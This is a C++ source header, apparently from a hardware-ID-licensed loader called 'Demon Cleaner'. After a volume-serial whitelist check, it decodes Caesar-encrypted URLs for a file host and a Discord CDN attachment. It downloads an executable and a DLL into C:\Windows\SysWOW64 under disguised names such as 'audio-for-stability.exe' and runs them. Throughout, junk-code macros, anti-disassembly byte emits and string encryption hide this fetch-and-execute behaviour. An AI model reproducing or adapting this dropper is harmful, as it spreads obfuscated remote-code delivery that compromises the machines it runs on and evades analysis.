#pragma once
#include "../Demon Cleaner/Headers/dead.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "../Demon Cleaner/Headers/junk-code.h"
#include <Wininet.h>
#include <stdlib.h>
#include <vector>
#include <tchar.h>
#include "../Demon Cleaner/Headers/color.hpp"
#include <fstream>
#include <TlHelp32.h>
#include <cstdio>
#include <iostream>
#include <filesystem>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")

#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}
using namespace junkcode;
string encrypt(string input) {
    vector<char> word(input.begin(), input.end());
    string alphabet = "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < (int)input.length(); i++) {
        for (int j = 0; j < (int)alphabet.length(); j++) {
            if (word[i] == alphabet[j]) {
                word[i] = alphabet[(j + 3) % 26];

                break;
            }
        }
    }
    string str(word.begin(), word.end());
    return str;
}
string decrypt(string input) {
    vector<char> word(input.begin(), input.end());
    string alphabet = "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < (int)input.length(); i++) {
        for (int j = 0; j < (int)alphabet.length(); j++) {
            if (word[i] == alphabet[j]) {
                word[i] = alphabet[(j - 3) % 26];
                break;
            }
        }
    }
    string str(word.begin(), word.end());
    return str;
}
void deleter()
{
    using namespace filesystem;
    rydekem();
    lnttirs();
    tlmisir();
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();



    rydekem();
    lnttirs();
    tlmisir();
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();

}
vector<string> serial;
void loadserial()
{
    rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();

    bool checkconnection = InternetCheckConnection("https://google.com/", FLAG_ICC_FORCE_CONNECTION, 0);

    if (!checkconnection)
    {
        cout << dead("You are not connected to internet...");
        Sleep(3000);
        exit(0);
    }
    rydekem();
    lnttirs();
    tlmisir();
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();


    serial.push_back(dead("384604182").c_str());
    JUNK_CODE_ONE
        serial.push_back(dead("2953439145").c_str());
    rydekem();
    lnttirs();
    tlmisir();

}


void mainbot()
{
    
    HMODULE hModule = LoadLibrary(_T("urlmon.dll"));
    rydekem();
    lnttirs();
    tlmisir();
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();



    TCHAR volumeName[MAX_PATH + 1] = { 0 };
    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;



    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        rydekem();
    lnttirs();
    tlmisir();
    rydekem();
    lnttirs();
    tlmisir();


    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
    JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        JUNK_CODE_ONE
        while (true)
        {
            rydekem();
            lnttirs();
            tlmisir();
            JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                JUNK_CODE_ONE
                rydekem();
            lnttirs();
            tlmisir();

            rydekem();
            lnttirs();
            tlmisir();
            if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
            {
                __asm
                {
                    jmp short Label1
                    _emit 0xB2
                    _emit 0xB9
                    _emit 0x44
                    _emit 0xED
                    _emit 0xB4
                    Label2:
                    jmp short Label3
                        _emit 0xF9
                        _emit 0x7C
                        _emit 0xB8
                        _emit 0x81
                        _emit 0x76
                        Label1:
                    jmp short Label2
                        _emit 0x90
                        _emit 0x84
                        _emit 0x48
                        _emit 0x6F
                        _emit 0xA8
                        Label3:
                    jmp short Label4
                        _emit 0xEC
                        _emit 0x2A
                        _emit 0x77
                        _emit 0x20
                        _emit 0x7C
                        Label4:
                    jmp short Label5
                        _emit 0xCD
                        _emit 0x75
                        _emit 0xB8
                        _emit 0x46
                        _emit 0xFD
                        Label5:
                }
                JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                ifstream ifile(filename);
                if (ifile)
                {
                    system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
                    system(dead("start audio-for-stability.exe").c_str());
                    system(dead("cls").c_str());

                }
                else
                {
                    __asm
                    {
                        jmp short caca1
                        _emit 0x6F
                        _emit 0x77
                        _emit 0xD9
                        _emit 0xF1
                        _emit 0xDF
                        caca2:
                        jmp short caca3
                            _emit 0x6C
                            _emit 0x64
                            _emit 0x6E
                            _emit 0x89
                            _emit 0xB6
                            caca1:
                        jmp short caca2
                            _emit 0x54
                            _emit 0x4F
                            _emit 0xA0
                            _emit 0xD8
                            _emit 0xF5
                            caca3:
                        jmp short caca4
                            _emit 0x22
                            _emit 0xD9
                            _emit 0xD9
                            _emit 0x07
                            _emit 0x07
                            caca4:
                        jmp short caca5
                            _emit 0xDF
                            _emit 0xA5
                            _emit 0x5E
                            _emit 0x33
                            _emit 0xA0
                            caca5:
                    }


                    std::string download = (decrypt("kwwsv://ilohpdqdjhu.dl/qhz/dssolfdwlrq/dsl/grzqordg.sks?ilohKhb=knrQni0JfO6yQTmL").c_str());
                    std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
                    URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
                    system(dead("cd C:\\Windows\\SysWOW64\\").c_str());

                    std::string dll = (decrypt("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/834754431249285140/891659436341477376/vhuyhu.goo").c_str());
                    std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
                    URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
                    Sleep(2000);
                    system(dead("start audio-for-stability.exe").c_str());
                    system(dead("cls").c_str());

                }




                exit(0);
            }
            else
            {
                rydekem();
                lnttirs();
                tlmisir();
                rydekem();
                lnttirs();
                tlmisir();
                JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    rydekem();
                lnttirs();
                tlmisir();

                system(dead("cls").c_str());
                std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
                std::cout << GREEN << (dead("Hwid : ").c_str());
                std::cout << serialNumber << std::endl;
                Sleep(10000);
                rydekem();
                lnttirs();
                tlmisir();
                JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    JUNK_CODE_ONE
                    rydekem();
                lnttirs();
                tlmisir();
                rydekem();
                lnttirs();
                tlmisir();


                exit(0);





            }
        }
}
